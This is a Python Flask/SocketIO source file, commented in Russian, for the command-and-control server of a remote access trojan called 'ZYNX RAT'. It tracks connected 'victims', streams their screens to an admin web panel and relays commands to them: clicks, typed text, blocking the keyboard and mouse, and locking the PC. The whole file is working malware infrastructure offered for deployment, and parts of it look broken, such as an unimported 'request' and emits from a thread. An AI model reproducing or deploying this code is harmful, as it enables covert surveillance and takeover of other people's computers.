# app.py - ПОЛНАЯ ВЕРСИЯ ДЛЯ RENDER (БЕЗ pyautogui!)
from flask import Flask, render_template_string
from flask_socketio import SocketIO, emit
import base64
import json
import time
import os
import socket
import threading

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*")

# ==================== ХРАНИЛИЩЕ ====================
victims = []          # Список подключённых жертв (TCP)
clients = []          # Список подключённых админов (WebSocket)
current_frame = None

# ==================== HTML (АДМИНКА) ====================
HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZYNX RAT</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a12;
            font-family: 'Segoe UI', system-ui, sans-serif;
            color: #00d4ff;
            min-height: 100vh;
            padding: 15px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container { max-width: 1200px; width: 100%; }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 24px;
            background: rgba(0,212,255,0.03);
            border: 1px solid rgba(0,212,255,0.1);
            border-radius: 16px;
            margin-bottom: 16px;
            flex-wrap: wrap;
            gap: 10px;
        }
        .header .logo {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .header .logo i {
            font-size: 28px;
            color: #00d4ff;
        }
        .header .logo h1 {
            font-size: 24px;
            font-weight: 800;
            background: linear-gradient(90deg, #00d4ff, #00ff88);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .header .status {
            display: flex;
            gap: 20px;
            font-size: 12px;
            color: #888;
        }
        .header .status .stat { display: flex; align-items: center; gap: 6px; }
        .online { color: #00ff88; }
        .offline { color: #ff4444; }
        .video-box {
            background: #000;
            border: 1px solid rgba(0,212,255,0.1);
            border-radius: 16px;
            overflow: hidden;
            aspect-ratio: 16/9;
            cursor: crosshair;
            position: relative;
        }
        .video-box img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            display: block;
        }
        .video-box .placeholder {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #00d4ff;
            opacity: 0.3;
            text-align: center;
            pointer-events: none;
        }
        .video-box .placeholder i {
            font-size: 64px;
            display: block;
            margin-bottom: 15px;
        }
        .controls {
            display: flex;
            gap: 8px;
            padding: 12px 0;
            flex-wrap: wrap;
            justify-content: center;
        }
        .btn {
            background: rgba(0,212,255,0.05);
            color: #00d4ff;
            border: 1px solid rgba(0,212,255,0.1);
            border-radius: 10px;
            padding: 10px 18px;
            font-weight: 600;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 8px;
            user-select: none;
        }
        .btn:hover { background: rgba(0,212,255,0.1); transform: translateY(-2px); }
        .btn.active { background: rgba(0,212,255,0.15); border-color: #00d4ff; }
        .btn.danger { border-color: rgba(255,0,68,0.2); color: #ff0044; }
        .btn.danger:hover { background: rgba(255,0,68,0.1); }
        .btn i { font-size: 16px; }
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) translateY(20px);
            background: rgba(0,212,255,0.08);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(0,212,255,0.1);
            border-radius: 12px;
            padding: 12px 28px;
            color: #00d4ff;
            font-size: 13px;
            opacity: 0;
            transition: all 0.4s;
            pointer-events: none;
            z-index: 999;
        }
        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
        .keyboard-input {
            display: none;
            position: fixed;
            bottom: 100px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(10,10,18,0.96);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(0,212,255,0.1);
            border-radius: 16px;
            padding: 20px;
            z-index: 1000;
            min-width: 350px;
        }
        .keyboard-input input {
            background: rgba(0,212,255,0.05);
            color: #00d4ff;
            border: 1px solid rgba(0,212,255,0.1);
            border-radius: 10px;
            padding: 12px 16px;
            width: 100%;
            font-size: 16px;
            outline: none;
        }
        .keyboard-input .hint {
            font-size: 10px;
            opacity: 0.3;
            margin-top: 8px;
            text-align: center;
            letter-spacing: 2px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <i class="fas fa-skull"></i>
                <h1>ZYNX RAT</h1>
            </div>
            <div class="status">
                <span class="stat"><i class="fas fa-circle" id="statusDot" style="color:#ff4444;"></i> <span id="statusText" class="offline">OFFLINE</span></span>
                <span class="stat"><i class="fas fa-users"></i> <span id="clients">0</span></span>
                <span class="stat"><i class="fas fa-tachometer-alt"></i> <span id="fps">0</span> FPS</span>
            </div>
        </div>

        <div class="video-box" id="videoBox">
            <img id="screen" src="" alt="Screen">
            <div class="placeholder" id="placeholder">
                <i class="fas fa-desktop"></i>
                <span>AWAITING CONNECTION...</span>
            </div>
        </div>

        <div class="controls">
            <button class="btn" id="kbBtn" onclick="toggleKb()"><i class="fas fa-keyboard"></i> BLOCK KB</button>
            <button class="btn" id="msBtn" onclick="toggleMs()"><i class="fas fa-mouse"></i> BLOCK MS</button>
            <button class="btn" onclick="sendCommand('screenshot')"><i class="fas fa-camera"></i> SCREEN</button>
            <button class="btn" onclick="sendCommand('lock')"><i class="fas fa-lock"></i> LOCK PC</button>
            <button class="btn" onclick="showKeyboard()"><i class="fas fa-edit"></i> TYPE</button>
            <button class="btn danger" onclick="sendCommand('disconnect')"><i class="fas fa-power-off"></i> KILL</button>
        </div>
    </div>

    <div class="toast" id="toast"><i class="fas fa-info-circle"></i> <span id="toastText">Ready</span></div>

    <div class="keyboard-input" id="keyboardInput">
        <input type="text" id="textInput" placeholder="Type message and press Enter...">
        <div class="hint">PRESS ENTER TO SEND</div>
    </div>

    <script>
        const socket = io();
        const screen = document.getElementById('screen');
        const placeholder = document.getElementById('placeholder');
        const statusText = document.getElementById('statusText');
        const statusDot = document.getElementById('statusDot');
        const clientsEl = document.getElementById('clients');
        const fpsEl = document.getElementById('fps');
        const videoBox = document.getElementById('videoBox');
        const toast = document.getElementById('toast');
        const toastText = document.getElementById('toastText');
        const keyboardInput = document.getElementById('keyboardInput');
        const textInput = document.getElementById('textInput');

        let connected = false;
        let frameCount = 0;
        let lastFpsUpdate = Date.now();

        socket.on('connect', () => {
            connected = true;
            statusText.textContent = 'ONLINE';
            statusText.className = 'online';
            statusDot.style.color = '#00ff88';
            placeholder.style.display = 'none';
            showToast('✅ Connected!', 'fa-check-circle');
        });

        socket.on('disconnect', () => {
            connected = false;
            statusText.textContent = 'OFFLINE';
            statusText.className = 'offline';
            statusDot.style.color = '#ff4444';
            placeholder.style.display = 'block';
            showToast('❌ Disconnected', 'fa-exclamation-triangle');
        });

        socket.on('frame', (data) => {
            screen.src = 'data:image/jpeg;base64,' + data;
            frameCount++;
            const now = Date.now();
            if (now - lastFpsUpdate > 1000) {
                fpsEl.textContent = frameCount;
                frameCount = 0;
                lastFpsUpdate = now;
            }
        });

        socket.on('clients_count', (count) => { clientsEl.textContent = count; });

        function sendCommand(cmd, val) {
            socket.emit('command', {cmd: cmd, val: val});
            showToast('Command: ' + cmd, 'fa-terminal');
        }

        function showToast(text, icon = 'fa-info-circle') {
            toastText.textContent = text;
            toast.querySelector('i').className = 'fas ' + icon;
            toast.classList.add('show');
            clearTimeout(toast._timer);
            toast._timer = setTimeout(() => toast.classList.remove('show'), 2000);
        }

        videoBox.addEventListener('click', function(e) {
            const rect = this.getBoundingClientRect();
            const x = ((e.clientX - rect.left) / rect.width) * 100;
            const y = ((e.clientY - rect.top) / rect.height) * 100;
            socket.emit('command', {cmd: 'click', val: {x: x, y: y, button: 'left'}});
        });

        videoBox.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            const rect = this.getBoundingClientRect();
            const x = ((e.clientX - rect.left) / rect.width) * 100;
            const y = ((e.clientY - rect.top) / rect.height) * 100;
            socket.emit('command', {cmd: 'click', val: {x: x, y: y, button: 'right'}});
        });

        videoBox.addEventListener('wheel', function(e) {
            e.preventDefault();
            const delta = e.deltaY > 0 ? 'down' : 'up';
            socket.emit('command', {cmd: 'scroll', val: {delta: delta}});
        });

        function toggleKb() {
            const btn = document.getElementById('kbBtn');
            const active = btn.classList.toggle('active');
            btn.innerHTML = active ? '<i class="fas fa-keyboard"></i> BLOCKED' : '<i class="fas fa-keyboard"></i> BLOCK KB';
            socket.emit('command', {cmd: 'block_kb', val: active});
            showToast(active ? '⌨️ Keyboard BLOCKED' : '⌨️ Keyboard UNLOCKED', 'fa-keyboard');
        }

        function toggleMs() {
            const btn = document.getElementById('msBtn');
            const active = btn.classList.toggle('active');
            btn.innerHTML = active ? '<i class="fas fa-mouse"></i> BLOCKED' : '<i class="fas fa-mouse"></i> BLOCK MS';
            socket.emit('command', {cmd: 'block_mouse', val: active});
            showToast(active ? '🖱️ Mouse BLOCKED' : '🖱️ Mouse UNLOCKED', 'fa-mouse');
        }

        function showKeyboard() {
            keyboardInput.style.display = 'block';
            textInput.focus();
        }

        textInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                const text = this.value;
                if (text) {
                    socket.emit('command', {cmd: 'type', val: {text: text}});
                    showToast('⌨️ Typed: ' + text, 'fa-edit');
                    this.value = '';
                    keyboardInput.style.display = 'none';
                }
            }
            if (e.key === 'Escape') {
                keyboardInput.style.display = 'none';
            }
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML)

# ==================== WEBSOCKET ДЛЯ АДМИНА ====================
@socketio.on('connect')
def handle_connect():
    print('[+] Админ подключился')
    emit('clients_count', len(victims), broadcast=True)

@socketio.on('disconnect')
def handle_disconnect():
    print('[-] Админ отключился')

@socketio.on('command')
def handle_command(data):
    """Отправляет команду ВСЕМ жертвам"""
    cmd = data.get('cmd')
    val = data.get('val')
    print(f'[CMD] {cmd} = {val}')
    
    for victim in victims[:]:
        try:
            msg = json.dumps({'cmd': cmd, 'val': val}).encode()
            victim.sendall(len(msg).to_bytes(4, 'big'))
            victim.sendall(msg)
        except:
            if victim in victims:
                victims.remove(victim)
                emit('clients_count', len(victims), broadcast=True)

# ==================== WEBSOCKET ДЛЯ ЖЕРТВЫ ====================
@socketio.on('victim_connect')
def handle_victim_connect():
    """Жертва подключается по WebSocket"""
    clients.append(request.sid)
    print(f'[+] Жертва подключилась (WebSocket): {request.sid}')
    emit('clients_count', len(clients), broadcast=True)

@socketio.on('victim_frame')
def handle_victim_frame(data):
    """Жертва отправляет кадр по WebSocket"""
    emit('frame', data, broadcast=True, include_self=False)

@socketio.on('victim_command')
def handle_victim_command(data):
    """Админ отправляет команду жертве по WebSocket"""
    cmd = data.get('cmd')
    val = data.get('val')
    print(f'[CMD] {cmd} = {val}')
    emit('command', {'cmd': cmd, 'val': val}, broadcast=True, include_self=False)

# ==================== TCP СЕРВЕР ДЛЯ ЖЕРТВ (ОПЦИОНАЛЬНО) ====================
def tcp_server():
    """TCP-сервер для жертв (если нужен)"""
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', 5005))
        server.listen(10)
        print('[TCP] Сервер запущен на порту 5005')
        
        while True:
            try:
                client, addr = server.accept()
                print(f'[TCP] Жертва: {addr}')
                victims.append(client)
                emit('clients_count', len(victims), broadcast=True)
                threading.Thread(target=handle_tcp_victim, args=(client,), daemon=True).start()
            except Exception as e:
                print(f'[TCP] Ошибка: {e}')
                time.sleep(1)
    except Exception as e:
        print(f'[TCP] Не удалось запустить TCP-сервер: {e}')

def handle_tcp_victim(client):
    try:
        while True:
            size_data = client.recv(4)
            if not size_data:
                break
            frame_size = int.from_bytes(size_data, 'big')
            frame_data = b''
            while len(frame_data) < frame_size:
                chunk = client.recv(min(frame_size - len(frame_data), 65536))
                if not chunk:
                    break
                frame_data += chunk
            if len(frame_data) == frame_size:
                b64 = base64.b64encode(frame_data).decode('utf-8')
                socketio.emit('frame', b64, broadcast=True)
    except Exception as e:
        print(f'[TCP] Ошибка: {e}')
    finally:
        if client in victims:
            victims.remove(client)
            emit('clients_count', len(victims), broadcast=True)
        client.close()

# ==================== ЗАПУСК ====================
if __name__ == '__main__':
    # Запускаем TCP-сервер в фоне (если нужен)
    threading.Thread(target=tcp_server, daemon=True).start()
    
    # Запускаем Flask + WebSocket
    port = int(os.environ.get('PORT', 5000))
    socketio.run(app, host='0.0.0.0', port=port)
